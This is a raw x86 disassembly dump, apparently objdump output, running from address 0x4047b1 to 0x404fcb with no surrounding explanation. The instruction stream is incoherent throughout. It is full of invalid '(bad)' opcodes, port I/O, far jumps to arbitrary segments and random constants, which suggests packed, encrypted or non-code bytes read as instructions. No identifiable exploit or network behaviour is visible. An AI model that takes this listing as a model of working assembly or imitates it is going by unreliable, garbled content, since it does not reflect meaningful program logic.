  4047b1:	outs   dx,BYTE PTR ds:[esi]
  4047b2:	iret   
  4047b3:	mov    edx,0xd5f8b8c
  4047b8:	inc    edx
  4047b9:	or     edi,edi
  4047bb:	ja     0x4047dd
  4047bd:	pop    edx
  4047be:	ds and eax,0x17de53fc
  4047c4:	je     0x4047bc
  4047c6:	ja     0x4047b1
  4047c8:	test   bl,ch
  4047ca:	test   eax,0x8f5a1350
  4047cf:	push   es
  4047d0:	xchg   DWORD PTR [edi+eiz*8-0x518ef815],edi
  4047d7:	in     al,dx
  4047d8:	hlt    
  4047d9:	mov    ecx,0xedf3015b
  4047de:	aam    0xff
  4047e0:	popa   
  4047e1:	or     al,0x10
  4047e3:	lahf   
  4047e4:	and    DWORD PTR [edx+0x5e0b14de],ecx
  4047ea:	arpl   WORD PTR [eax+0x2],bx
  4047ed:	dec    esp
  4047ee:	jge    0x4047bf
  4047f0:	jle    0x4047ad
  4047f2:	mov    dl,0x55
  4047f4:	pop    ebp
  4047f5:	inc    eax
  4047f6:	jmp    0x1e73:0x835af450
  4047fd:	js     0x4047b8
  4047ff:	mov    esi,0x2fad2460
  404804:	cmp    dl,BYTE PTR [edi+0x32427567]
  40480a:	addr16 push ebx
  40480c:	ins    BYTE PTR es:[edi],dx
  40480d:	nop
  40480e:	xor    eax,0x1eedddc6
  404813:	push   ebp
  404814:	inc    eax
  404815:	add    eax,0x4fb2563e
  40481a:	jmp    0x983:0xb568e119
  404821:	mov    eax,0xa21240ab
  404826:	pop    ebp
  404827:	mov    ds:0xce5367d2,al
  40482c:	pop    ebx
  40482d:	mov    bh,0x6f
  40482f:	imul   eax,DWORD PTR [edx],0xfffffff2
  404832:	aad    0xd6
  404834:	lea    edx,[ebx]
  404836:	or     eax,0xa7596ab2
  40483b:	out    0xe9,al
  40483d:	pop    es
  40483e:	jmp    0x8489ed1a
  404843:	fld    st(2)
  404845:	add    bl,BYTE PTR [esi-0x49]
  404848:	xchg   ebx,eax
  404849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40484a:	and    ecx,ebx
  40484c:	pop    ecx
  40484d:	pop    esp
  40484e:	popf   
  40484f:	xor    eax,ebp
  404851:	and    al,0x57
  404853:	enter  0x245b,0x80
  404857:	push   ds
  404858:	adc    dh,BYTE PTR [ebp-0x56e28564]
  40485e:	cmc    
  40485f:	jl     0x4048cd
  404861:	or     esi,DWORD PTR [esi+0x5de005a7]
  404867:	add    ebx,ecx
  404869:	inc    edi
  40486a:	rol    BYTE PTR [ebp-0x2bca86c2],cl
  404870:	mov    ch,0xd9
  404872:	lea    edx,[esi+0x37]
  404875:	shr    DWORD PTR [esi+0x2f],0xff
  404879:	(bad)  
  40487a:	out    dx,eax
  40487b:	addr16 jbe 0x4048aa
  40487e:	adc    al,0x5b
  404880:	mov    ebx,DWORD PTR [eax+edi*1+0x1253156]
  404887:	sbb    BYTE PTR [esi+eiz*8-0x30],0x88
  40488c:	sahf   
  40488d:	jmp    0x8fe7:0x258c38f1
  404894:	mov    cl,0x6
  404896:	lods   eax,DWORD PTR ds:[esi]
  404897:	mov    ch,0xbd
  404899:	lods   eax,DWORD PTR ds:[esi]
  40489a:	push   edx
  40489b:	adc    DWORD PTR [ebx-0x8],eax
  40489e:	out    dx,al
  40489f:	jmp    0x4048f3
  4048a1:	xchg   esi,eax
  4048a2:	jbe    0x404857
  4048a4:	mov    dl,0x2f
  4048a6:	add    al,0x23
  4048a8:	xchg   ecx,eax
  4048a9:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048ab:	pop    ss
  4048ac:	sub    eax,0x3479c3e3
  4048b1:	pop    es
  4048b2:	and    eax,0xf26bffef
  4048b7:	jne    0x404938
  4048b9:	adc    edi,edx
  4048bb:	lods   eax,DWORD PTR ds:[esi]
  4048bc:	add    bl,0xbe
  4048bf:	xor    BYTE PTR [ebx+esi*4-0x86abc5c],dh
  4048c6:	mov    ds:0xf9a5b0a,eax
  4048cb:	popa   
  4048cc:	lea    edx,[esp-0x27]
  4048d0:	dec    ebp
  4048d1:	retf   0x46d1
  4048d4:	pop    ebp
  4048d5:	sbb    dl,BYTE PTR [esi-0x2cbeddfe]
  4048db:	cmp    eax,0xd7516683
  4048e0:	(bad)  
  4048e1:	fs test eax,0x40677b6b
  4048e7:	mov    ecx,0x68f72581
  4048ec:	into   
  4048ed:	(bad)  
  4048ee:	jnp    0x404910
  4048f0:	cs adc al,0x5f
  4048f3:	sub    al,BYTE PTR [edi+eiz*4-0x6601285d]
  4048fa:	es jne 0x404978
  4048fd:	stc    
  4048fe:	(bad)  
  4048ff:	sub    eax,0x1fec749
  404904:	jge    0x4048bf
  404906:	push   eax
  404907:	test   BYTE PTR [edx-0x58],bl
  40490a:	mov    BYTE PTR [esi+0x3c710605],bh
  404910:	inc    esp
  404911:	jl     0x404984
  404913:	js     0x4048ed
  404915:	pop    ebx
  404916:	cmp    al,0x48
  404918:	cmp    esp,DWORD PTR [ebx-0x62]
  40491b:	leave  
  40491c:	ins    BYTE PTR es:[edi],dx
  40491d:	xor    DWORD PTR [edi+0x155fa025],ebp
  404923:	mov    ah,0x51
  404925:	mov    ebp,0x24a6b786
  40492a:	dec    ebp
  40492b:	mov    bl,0x7d
  40492d:	sti    
  40492e:	nop
  40492f:	mov    edx,0x77c378db
  404934:	dec    esi
  404935:	call   0x20a00c4f
  40493a:	ins    BYTE PTR es:[edi],dx
  40493b:	pop    ds
  40493c:	xchg   esi,eax
  40493d:	mov    al,BYTE PTR [ecx+0x3f9de09]
  404943:	xchg   ebx,eax
  404944:	(bad)  
  404945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404946:	cwde   
  404947:	adc    BYTE PTR [ecx+0x73dc7f13],0x21
  40494e:	gs pop edx
  404950:	mov    al,0x39
  404952:	push   edx
  404953:	pop    ebp
  404954:	dec    edi
  404955:	inc    esp
  404956:	and    dl,bl
  404958:	pop    ecx
  404959:	mov    cl,bh
  40495b:	add    edi,DWORD PTR [esi+0x540ae265]
  404961:	test   DWORD PTR [edi+0x56],esp
  404964:	xor    eax,0x11711995
  404969:	std    
  40496a:	and    BYTE PTR [esi+edx*2],al
  40496d:	adc    DWORD PTR [ebx+ebx*8-0x49],ecx
  404971:	imul   esp,eax,0x1e
  404974:	fwait
  404975:	arpl   WORD PTR [ebx],bp
  404977:	or     eax,0xff2df7
  40497c:	and    edx,edx
  40497e:	xor    eax,0xd84e86c8
  404983:	pop    esi
  404984:	inc    edi
  404985:	push   ebx
  404986:	cmp    esi,esp
  404988:	dec    ecx
  404989:	jnp    0x4049b6
  40498b:	and    BYTE PTR [edi+0x1f],bh
  40498e:	hlt    
  40498f:	(bad)  
  404990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404992:	dec    eax
  404993:	mov    cl,0x61
  404995:	cld    
  404996:	mov    ah,0x21
  404998:	push   esi
  404999:	push   0x4f
  40499b:	or     al,BYTE PTR [edx-0x7cabc54b]
  4049a1:	enter  0xcb8b,0xb6
  4049a5:	test   BYTE PTR [edi],ah
  4049a7:	test   eax,0x4ec164c5
  4049ac:	sar    DWORD PTR [esi],0xd1
  4049af:	xor    eax,0xdf223204
  4049b4:	fcom   QWORD PTR ds:0x14d4b68f
  4049ba:	push   ss
  4049bb:	out    dx,al
  4049bc:	push   eax
  4049bd:	mov    DWORD PTR [ebx+0x7e],esp
  4049c0:	adc    BYTE PTR [ebp-0x58],al
  4049c3:	jne    0x404a02
  4049c5:	cli    
  4049c6:	or     eax,0x15751ae9
  4049cb:	sub    BYTE PTR [esi+eiz*2-0x2b8c84ce],dl
  4049d2:	fnstenv [eax+eax*1]
  4049d5:	cwde   
  4049d6:	repnz xor BYTE PTR [ebx+esi*4+0x1058de3b],0x77
  4049df:	(bad)  
  4049e0:	sahf   
  4049e1:	(bad)  
  4049e2:	jmp    0x6f68:0x5673cf2e
  4049e9:	push   cs
  4049ea:	mov    cl,0x9b
  4049ec:	fidiv  DWORD PTR [ebx-0x74]
  4049ef:	inc    esp
  4049f0:	inc    esi
  4049f1:	fsubr  DWORD PTR [esi+0x6f]
  4049f4:	(bad)
  4049f7:	mov    edx,0x899df214
  4049fc:	adc    BYTE PTR [edx],dh
  4049fe:	ds cs popf 
  404a01:	and    al,BYTE PTR [esp+esi*4-0x63]
  404a05:	pop    ebx
  404a06:	addr16 cmp eax,0xb37282dc
  404a0c:	ror    BYTE PTR [esi-0x57],1
  404a0f:	mov    dh,dl
  404a11:	pusha  
  404a12:	jb     0x4049ee
  404a14:	pop    ebp
  404a15:	repnz ror DWORD PTR [esi+0x3e6d36a5],1
  404a1c:	retf   
  404a1d:	(bad)  
  404a1e:	adc    bl,ch
  404a20:	or     ecx,DWORD PTR [ecx-0x1c643591]
  404a26:	or     dh,BYTE PTR ds:0xd2830d82
  404a2c:	xchg   esp,eax
  404a2d:	shl    BYTE PTR [ebp+0x1c361bdb],cl
  404a33:	and    al,BYTE PTR [edi-0x6a961bec]
  404a39:	cmp    edi,edx
  404a3b:	push   edx
  404a3c:	imul   esp,ecx,0x1e
  404a3f:	js     0x404a03
  404a41:	bound  ebp,QWORD PTR [edi+0x48]
  404a44:	push   edx
  404a45:	sbb    dl,BYTE PTR [edi-0x6b]
  404a48:	xor    bl,bl
  404a4a:	cmp    DWORD PTR [eax+0x3f],0xafdf0056
  404a51:	and    ebx,DWORD PTR [ebx]
  404a53:	push   ecx
  404a54:	int    0xa
  404a56:	jle    0x404acf
  404a58:	stc    
  404a59:	xchg   edx,eax
  404a5a:	fidiv  WORD PTR [eax-0x45]
  404a5d:	jmp    0x404ac7
  404a5f:	outs   dx,BYTE PTR ds:[esi]
  404a60:	sub    ebx,edx
  404a62:	push   esp
  404a63:	xchg   BYTE PTR [ebx+0x4374dff4],bl
  404a69:	sti    
  404a6a:	xchg   ebx,eax
  404a6b:	rol    ch,0xef
  404a6e:	push   ebp
  404a6f:	cwde   
  404a70:	jmp    0x637e:0x12609e88
  404a77:	dec    edi
  404a78:	mov    eax,0x8cbecc52
  404a7d:	mov    ds:0x5d7f572c,eax
  404a82:	mov    bl,0x9b
  404a84:	mov    al,ds:0x60cd7c0e
  404a89:	jmp    0x9876035b
  404a8e:	in     eax,0xa6
  404a90:	ins    BYTE PTR es:[edi],dx
  404a91:	xchg   ebp,eax
  404a92:	daa    
  404a93:	or     eax,0xcf2d7413
  404a98:	pop    ecx
  404a99:	xor    esi,DWORD PTR [esi]
  404a9b:	stos   BYTE PTR es:[edi],al
  404a9c:	neg    BYTE PTR [ecx+0x23de810e]
  404aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aa3:	leave  
  404aa4:	xchg   ebx,eax
  404aa5:	ja     0x404a32
  404aa7:	xor    esi,0x6fe96a3b
  404aad:	jp     0x404af2
  404aaf:	xor    BYTE PTR [ebx+0x5a],bl
  404ab2:	call   FWORD PTR [edi+0x5de109b]
  404ab8:	cmovge edx,DWORD PTR [ecx-0x68]
  404abc:	fldcw  WORD PTR [edx+0x2ceba89]
  404ac2:	in     al,0x8c
  404ac4:	stos   DWORD PTR es:[edi],eax
  404ac5:	jo     0x404aff
  404ac7:	dec    esp
  404ac8:	jge    0x404b30
  404aca:	out    0x66,eax
  404acc:	xor    esi,DWORD PTR [edi-0x5b9ba9af]
  404ad2:	stc    
  404ad3:	xor    al,0x28
  404ad5:	loope  0x404a60
  404ad7:	mov    ch,0x73
  404ad9:	pop    edi
  404ada:	cld    
  404adb:	out    0x81,eax
  404add:	gs pop edx
  404adf:	cmp    cl,BYTE PTR [ebp+0x62]
  404ae2:	jl     0x404a9b
  404ae4:	mov    ecx,0xed7e1c3
  404ae9:	sbb    esi,edx
  404aeb:	icebp  
  404aec:	cs stos DWORD PTR es:[edi],eax
  404aee:	jb     0x404a9c
  404af0:	jecxz  0x404b01
  404af2:	jg     0x404b3b
  404af4:	mov    ds:0x420ab741,al
  404af9:	jp     0x404ac6
  404afb:	mov    ax,0x5553
  404aff:	pop    esi
  404b00:	xor    ah,0x25
  404b03:	(bad)  
  404b04:	mov    bh,0xbe
  404b06:	mov    bh,0x0
  404b08:	lea    eax,[esi]
  404b0a:	out    0xf7,al
  404b0c:	push   esi
  404b0d:	cmp    bh,BYTE PTR [ebx+0x49]
  404b10:	gs cwde 
  404b12:	xchg   edx,eax
  404b13:	je     0x404abd
  404b15:	pushf  
  404b16:	js     0x404acc
  404b18:	pop    es
  404b19:	nop
  404b1a:	imul   edx,DWORD PTR [ebp+0x3e383c1b],0xdb2f24e8
  404b24:	(bad)  
  404b25:	pop    ecx
  404b26:	sbb    BYTE PTR [esi+0x7753b70a],bh
  404b2c:	pop    ecx
  404b2d:	xchg   esp,eax
  404b2e:	pop    esi
  404b2f:	pop    es
  404b30:	jnp    0x404b10
  404b32:	mov    edx,0x183ca82b
  404b37:	ds xchg edi,eax
  404b39:	jp     0x404bb8
  404b3b:	sbb    eax,0xfcc3b28d
  404b40:	jmp    0x894a:0x831661ea
  404b47:	loope  0x404bac
  404b49:	pop    edi
  404b4a:	gs pop edx
  404b4c:	pusha  
  404b4d:	aam    0x94
  404b4f:	in     eax,0x23
  404b51:	sub    al,0xf8
  404b53:	enter  0x939b,0x8f
  404b57:	retf   0xa416
  404b5a:	pop    ecx
  404b5b:	adc    ebx,esp
  404b5d:	inc    esp
  404b5e:	daa    
  404b5f:	stos   DWORD PTR es:[edi],eax
  404b60:	dec    edx
  404b61:	pop    ds
  404b62:	popa   
  404b63:	stos   BYTE PTR es:[edi],al
  404b64:	xor    dl,bh
  404b66:	mov    esi,0x6f5d2bf4
  404b6b:	xchg   BYTE PTR [ebp-0x528e0879],bh
  404b71:	mov    ebx,0x7b38e4fc
  404b76:	xor    eax,DWORD PTR [ecx+0x32]
  404b79:	and    DWORD PTR [ecx+0x44],esi
  404b7c:	imul   esp,eax,0xc450504f
  404b82:	cmp    al,0x43
  404b84:	stc    
  404b85:	test   DWORD PTR [ecx+0x25],ebp
  404b88:	mov    ebp,0xd39935ca
  404b8d:	les    ecx,FWORD PTR [edi-0x61]
  404b90:	push   edx
  404b91:	cmp    DWORD PTR [ecx+ebx*2+0x53e8d3d5],ebp
  404b98:	imul   esi,DWORD PTR [ecx],0xffffffc2
  404b9b:	fucom  st(4)
  404b9d:	xor    DWORD PTR [edi+0x318f0e61],esi
  404ba3:	or     DWORD PTR [edi+ecx*8-0x66],0x4
  404ba8:	iret   
  404ba9:	cwde   
  404baa:	mov    bl,0xde
  404bac:	int3   
  404bad:	add    DWORD PTR [esi],edx
  404baf:	sub    al,0x37
  404bb1:	jge    0x404b54
  404bb3:	loope  0x404b8c
  404bb5:	arpl   WORD PTR [esi],bx
  404bb7:	daa    
  404bb8:	les    ecx,FWORD PTR [ebp-0x711d1f94]
  404bbe:	dec    edi
  404bbf:	mov    al,0x39
  404bc1:	bound  esi,QWORD PTR [ecx]
  404bc3:	push   ecx
  404bc4:	jnp    0x404ba8
  404bc6:	ds clc 
  404bc8:	mov    dh,0xe3
  404bca:	add    esi,DWORD PTR [edi+0x6a4cfccb]
  404bd0:	inc    esi
  404bd1:	(bad)  [edi]
  404bd3:	sub    eax,DWORD PTR [edi-0x10]
  404bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd7:	clc    
  404bd8:	idiv   dh
  404bda:	inc    ebp
  404bdb:	push   ebp
  404bdc:	mov    ebx,esi
  404bde:	mov    ebp,0x8c268398
  404be3:	or     edx,DWORD PTR [ecx]
  404be5:	clc    
  404be6:	mov    dh,BYTE PTR [esi-0x24]
  404be9:	cmc    
  404bea:	(bad)  
  404beb:	jmp    0xc709dab2
  404bf0:	lahf   
  404bf1:	fild   DWORD PTR [ebx+0x9]
  404bf4:	out    dx,al
  404bf5:	js     0x404c6e
  404bf7:	sub    DWORD PTR [edx-0x63ade69c],0xe6bd5b44
  404c01:	cmc    
  404c02:	jb     0x404c64
  404c04:	cmc    
  404c05:	loope  0x404c51
  404c07:	popa   
  404c08:	call   0x7018:0x6ca4895
  404c0f:	mov    WORD PTR [edi-0x7c47256],ds
  404c15:	addr16 popf 
  404c17:	pushf  
  404c18:	xchg   ebp,eax
  404c19:	push   edx
  404c1a:	jg     0x404c1d
  404c1c:	jmp    0xb758ac2a
  404c21:	xor    al,0xc2
  404c23:	jns    0x404bd0
  404c25:	mov    edx,0x24bc196d
  404c2a:	pop    DWORD PTR [ecx+0x5408a562]
  404c30:	or     dl,BYTE PTR [ecx]
  404c32:	mov    esp,0x5d68390f
  404c37:	or     BYTE PTR [esi-0x5e0e0eab],0xbb
  404c3e:	ror    DWORD PTR [ecx-0x3d],cl
  404c41:	jp     0x404bf8
  404c43:	and    ah,BYTE PTR [ecx-0x55]
  404c46:	and    ah,ch
  404c48:	add    ah,al
  404c4a:	loopne 0x404cc8
  404c4c:	gs pop eax
  404c4e:	scas   eax,DWORD PTR es:[edi]
  404c4f:	dec    eax
  404c50:	jnp    0x404cbd
  404c52:	mov    ebx,DWORD PTR [edx+ecx*4-0x37]
  404c56:	lock cli 
  404c58:	cmp    eax,0xbae6a3ef
  404c5d:	fisubr DWORD PTR [ecx+0x6d]
  404c60:	dec    ebp
  404c61:	jl     0x404c4a
  404c63:	nop
  404c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c65:	sbb    DWORD PTR [ebx-0x149d7e1e],ebx
  404c6b:	dec    ecx
  404c6c:	je     0x404c16
  404c6e:	add    ch,BYTE PTR ds:0x264c63bc
  404c74:	push   ds
  404c75:	repnz xor eax,0x8ade2a41
  404c7b:	daa    
  404c7c:	mov    edx,0x680b2fa8
  404c81:	adc    bl,BYTE PTR [esi]
  404c83:	cmp    al,0xaa
  404c85:	call   0xb5b4:0xd1cb3430
  404c8c:	adc    dl,cl
  404c8e:	jmp    FWORD PTR [ebx-0x53da0e83]
  404c94:	sbb    bh,BYTE PTR [edx+ecx*1]
  404c97:	sar    DWORD PTR [eax],0xc4
  404c9a:	leave  
  404c9b:	sbb    ecx,edx
  404c9d:	aad    0xad
  404c9f:	xchg   BYTE PTR [esi+ebx*8-0x7466a9e3],dh
  404ca6:	lds    esp,FWORD PTR [ebx+0x33]
  404ca9:	and    eax,0x178938e1
  404cae:	push   ecx
  404caf:	out    0xfb,eax
  404cb1:	xor    bh,al
  404cb3:	mov    BYTE PTR [edx+0x6c],bh
  404cb6:	sbb    al,0xef
  404cb8:	cmp    BYTE PTR [ebx+0x5426dc9a],bh
  404cbe:	das    
  404cbf:	jg     0x404d0a
  404cc1:	jl     0x404d41
  404cc3:	sbb    eax,0x8d2c9c3d
  404cc8:	es (bad) 
  404cca:	and    eax,0x8445763b
  404ccf:	jle    0x404c78
  404cd1:	out    dx,eax
  404cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cd3:	rcl    BYTE PTR [edx-0x32881c47],0x7e
  404cda:	int    0x25
  404cdc:	lods   al,BYTE PTR ds:[esi]
  404cdd:	mov    ds:0x8e29d77e,al
  404ce2:	lea    ecx,es:0xa53ffd4c
  404ce9:	fsub   st,st(1)
  404ceb:	inc    eax
  404cec:	es xchg bh,ch
  404cef:	cmp    eax,0x8acb626e
  404cf4:	sti    
  404cf5:	sbb    eax,0x8804062
  404cfa:	in     al,dx
  404cfb:	loop   0x404d60
  404cfd:	daa    
  404cfe:	int3   
  404cff:	int3   
  404d00:	leave  
  404d01:	sbb    ecx,edi
  404d03:	iret   
  404d04:	inc    edi
  404d05:	jmp    0x404cbc
  404d07:	push   ds
  404d08:	lahf   
  404d09:	clc    
  404d0a:	imul   esp,DWORD PTR [ebx],0x7213c826
  404d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d11:	cmc    
  404d12:	sbb    BYTE PTR [eax+0xb],bh
  404d15:	inc    eax
  404d16:	sbb    ebp,DWORD PTR [eax+0x7148e689]
  404d1c:	stos   BYTE PTR es:[edi],al
  404d1d:	and    al,0xd6
  404d1f:	mov    edi,0xdc693dea
  404d24:	ins    DWORD PTR es:[edi],dx
  404d25:	pop    ebp
  404d26:	inc    ebx
  404d27:	pop    ebp
  404d28:	test   BYTE PTR [esi+0x64],ch
  404d2b:	sbb    ecx,DWORD PTR ds:0xf7a99a0b
  404d31:	inc    esi
  404d32:	push   ebx
  404d33:	std    
  404d34:	in     al,0xc0
  404d36:	sbb    DWORD PTR [eax+0x2df04aa5],0x31734a34
  404d40:	leave  
  404d41:	(bad)  
  404d42:	sbb    ah,al
  404d44:	push   0x6a
  404d46:	or     eax,0xf3cf5c42
  404d4b:	inc    edx
  404d4c:	push   esi
  404d4d:	out    dx,al
  404d4e:	xor    al,0x83
  404d50:	sbb    DWORD PTR [eax-0x41],esi
  404d53:	aad    0xb4
  404d55:	daa    
  404d56:	out    0x98,eax
  404d58:	test   al,0x4d
  404d5a:	lea    ecx,[edi+0x5f]
  404d5d:	loop   0x404d94
  404d5f:	lods   eax,DWORD PTR ds:[esi]
  404d60:	arpl   WORD PTR [esi],si
  404d62:	add    al,0xd3
  404d64:	rcr    BYTE PTR [edi+0x2b],0xf9
  404d68:	mov    ebx,0x7c6e4183
  404d6d:	out    dx,al
  404d6e:	and    dh,BYTE PTR [ebx+0x8849f3a]
  404d74:	icebp  
  404d75:	push   ebp
  404d76:	jae    0x404d23
  404d78:	pop    ds
  404d79:	popf   
  404d7a:	inc    BYTE PTR ds:0xdd51997f
  404d80:	repnz sbb ah,BYTE PTR [eax+esi*2]
  404d84:	inc    ebx
  404d85:	mov    dh,BYTE PTR [esp+ebp*4+0x61566349]
  404d8c:	mov    bh,0x3e
  404d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d8f:	(bad)  
  404d90:	imul   edi,DWORD PTR [edi+0x53873d42],0x2db2a65c
  404d9a:	pop    es
  404d9b:	add    DWORD PTR [ebx-0x66],eax
  404d9e:	ficomp DWORD PTR [ecx+0x6310f1a1]
  404da4:	ja     0x404da4
  404da6:	mov    esp,0xce67992a
  404dab:	mov    edx,0x23ee61ad
  404db0:	adc    dh,bl
  404db2:	mov    esi,0x3eb06b3
  404db7:	hlt    
  404db8:	mov    ebx,0xa1323620
  404dbd:	cdq    
  404dbe:	enter  0x1e62,0x35
  404dc2:	(bad)  
  404dc3:	repz push edi
  404dc5:	aad    0xe2
  404dc7:	jmp    0x404d5f
  404dc9:	repz ret 0xf927
  404dcd:	loop   0x404d50
  404dcf:	fmul   QWORD PTR [eax]
  404dd1:	mov    eax,0xd50de123
  404dd6:	hlt    
  404dd7:	push   ebx
  404dd8:	nop
  404dd9:	into   
  404dda:	mov    edx,0x32e35827
  404ddf:	xor    eax,0xabe39a6e
  404de4:	mov    cl,0xc3
  404de6:	pop    edi
  404de7:	std    
  404de8:	daa    
  404de9:	push   es
  404dea:	cmp    esp,0x6293f956
  404df0:	fimul  WORD PTR [esi-0x4c]
  404df3:	and    ecx,DWORD PTR [esi+0x3e]
  404df6:	pop    eax
  404df7:	xchg   DWORD PTR [esi-0x6],ebx
  404dfa:	je     0x404e0d
  404dfc:	mov    eax,0xebd9063d
  404e01:	fs sbb eax,0xcd4a14d9
  404e07:	jne    0x404dfb
  404e09:	cmp    edi,edx
  404e0b:	out    0xa1,al
  404e0d:	bound  esp,QWORD PTR [ebx+0x7979eb3]
  404e13:	push   eax
  404e14:	ins    BYTE PTR es:[edi],dx
  404e15:	jmp    0x992d7a0
  404e1a:	dec    ebx
  404e1b:	jmp    0x404e33
  404e1d:	mov    al,ds:0xc83b1b
  404e22:	dec    edi
  404e23:	jmp    0xed35126e
  404e28:	push   edx
  404e29:	jae    0x404e5b
  404e2b:	sbb    eax,0x5e12f5c4
  404e30:	stos   BYTE PTR es:[edi],al
  404e31:	cwde   
  404e32:	mov    BYTE PTR [edi+eiz*8-0x7ddf77d3],dh
  404e39:	shr    BYTE PTR [ecx+0x0],1
  404e3c:	jle    0x404e19
  404e3e:	push   es
  404e3f:	mov    ebp,0x8f2b0a1e
  404e44:	xchg   ecx,eax
  404e45:	sbb    esp,eax
  404e47:	and    BYTE PTR [edi],0xfe
  404e4a:	xor    DWORD PTR ds:0xaa828153,edi
  404e50:	push   ss
  404e51:	lahf   
  404e52:	(bad)  
  404e53:	mov    dh,0x90
  404e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e56:	sbb    eax,0xe60b1cb4
  404e5b:	rol    bh,cl
  404e5d:	xchg   ebx,ecx
  404e5f:	cmc    
  404e60:	push   esp
  404e61:	arpl   WORD PTR [ecx-0x3b40f2dd],dx
  404e67:	jns    0x404ea4
  404e69:	call   0xfd41:0xb1dad337
  404e70:	mov    ds:0x69dcfeb,al
  404e75:	pop    esi
  404e76:	lds    ebp,FWORD PTR [ebx+0x2e]
  404e79:	jno    0x404e5a
  404e7b:	push   0xb830b24f
  404e80:	xor    dl,ah
  404e82:	bnd jl 0x404e60
  404e85:	push   ss
  404e86:	jns    0x404e8a
  404e88:	lds    ebp,FWORD PTR [ecx+0x569b8ef3]
  404e8e:	or     ah,BYTE PTR [edx+eax*8+0x329f6d27]
  404e95:	pop    esp
  404e96:	jbe    0x404ea3
  404e98:	call   0x72cf68db
  404e9d:	fsubr  st,st(2)
  404e9f:	cmc    
  404ea0:	dec    esi
  404ea1:	ret    0x5ee3
  404ea4:	or     esi,DWORD PTR [ebx]
  404ea6:	frstor [ebx-0x5d]
  404ea9:	add    ah,BYTE PTR [esi+ecx*1]
  404eac:	out    dx,eax
  404ead:	jl     0x404f02
  404eaf:	sub    al,BYTE PTR [ecx+edx*4+0x8]
  404eb3:	dec    ecx
  404eb4:	js     0x404ea4
  404eb6:	fucomp st(1)
  404eb8:	sbb    al,ah
  404eba:	test   eax,0x8d25962d
  404ebf:	sbb    dl,BYTE PTR [esi-0x156813d0]
  404ec5:	mov    bl,0xa5
  404ec7:	adc    bl,BYTE PTR [edi+eax*1+0x350872b8]
  404ece:	int    0xa6
  404ed0:	sar    DWORD PTR [eax],cl
  404ed2:	mov    al,0xe9
  404ed4:	rcl    BYTE PTR [edi-0x6d],0x81
  404ed8:	mov    fs,WORD PTR [edx+eax*8]
  404edb:	ins    DWORD PTR es:[edi],dx
  404edc:	mov    edx,0x122fa84d
  404ee1:	inc    esi
  404ee2:	shr    BYTE PTR [edx-0x6a94c219],0xc4
  404ee9:	mov    esp,0xb01e12e2
  404eee:	sbb    dl,BYTE PTR [ebp+0x37b05096]
  404ef4:	jnp    0x404f73
  404ef6:	or     al,0x61
  404ef8:	ret    
  404ef9:	cld    
  404efa:	aaa    
  404efb:	test   al,0x1b
  404efd:	ss aas 
  404eff:	retf   0xc9af
  404f02:	adc    edx,DWORD PTR [edx+0x79]
  404f05:	sub    edx,edx
  404f07:	fbstp  TBYTE PTR [edi+0x5b53ea98]
  404f0d:	mov    WORD PTR [ecx-0x5744a8b0],fs
  404f13:	adc    cl,BYTE PTR [ebx]
  404f15:	fucomip st,st(4)
  404f17:	repnz cmp eax,0x64186a31
  404f1d:	test   BYTE PTR [esi-0x32],al
  404f20:	dec    esp
  404f21:	adc    DWORD PTR [esp+edx*2-0x6f],edx
  404f25:	xchg   esp,eax
  404f26:	adc    edx,ebx
  404f28:	xchg   esi,eax
  404f29:	stc    
  404f2a:	imul   ecx,DWORD PTR [edx-0x77],0x4d
  404f2e:	add    DWORD PTR [edx+0x2f9c9d0],ebp
  404f34:	imul   esp,DWORD PTR [edx+0x5c],0xffffff9d
  404f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f39:	jmp    0xb45a:0xa87d3a2d
  404f40:	loop   0x404f61
  404f42:	mov    al,ds:0xca0e767
  404f47:	cwde   
  404f48:	ds mov esi,0xb1b8c10d
  404f4e:	test   BYTE PTR [ecx+0x13cc8c],al
  404f54:	mov    dl,0x70
  404f56:	push   eax
  404f57:	fimul  DWORD PTR [ebp+0x73]
  404f5a:	adc    eax,0xa994b84f
  404f5f:	xchg   esp,eax
  404f60:	mov    bh,0x8d
  404f62:	pop    edi
  404f63:	sub    eax,DWORD PTR [edx+eax*4+0x5ba7b196]
  404f6a:	push   esi
  404f6b:	inc    BYTE PTR [edi+0x220f124f]
  404f71:	push   eax
  404f72:	sub    ah,BYTE PTR [edx+ebp*2]
  404f75:	repnz xor ebx,DWORD PTR [ecx+0x44]
  404f79:	repnz mov ebx,0xce6c6bdf
  404f7f:	and    BYTE PTR [edx+0x7d],dl
  404f82:	inc    edx
  404f83:	xchg   ebp,eax
  404f84:	xor    BYTE PTR [edx+0x7a],ch
  404f87:	sahf   
  404f88:	out    0xef,eax
  404f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f8b:	inc    edx
  404f8c:	into   
  404f8d:	nop
  404f8e:	or     ecx,0x34
  404f91:	mov    al,ds:0x5bad560d
  404f96:	sub    bl,cl
  404f98:	lea    esi,[ebp+0x18]
  404f9b:	sti    
  404f9c:	jge    0x404f20
  404f9e:	fcomp  QWORD PTR [edi-0x4e0619b6]
  404fa4:	xchg   DWORD PTR [ebx+0x23],edx
  404fa7:	xchg   esi,eax
  404fa8:	push   eax
  404fa9:	inc    DWORD PTR [edx]
  404fab:	push   ecx
  404fac:	xor    BYTE PTR [edx+edi*2+0x100ab333],dl
  404fb3:	pop    ebx
  404fb4:	rol    ebx,0xfd
  404fb7:	inc    edx
  404fb8:	jno    0x404f58
  404fba:	inc    esp
  404fbb:	enter  0xd335,0x34
  404fbf:	into   
  404fc0:	sub    al,0xd3
  404fc2:	sbb    BYTE PTR ds:0x8851c73a,ah
  404fc8:	pop    ss
  404fc9:	xchg   esp,eax
  404fca:	pop    edi
  404fcb:	icebp  
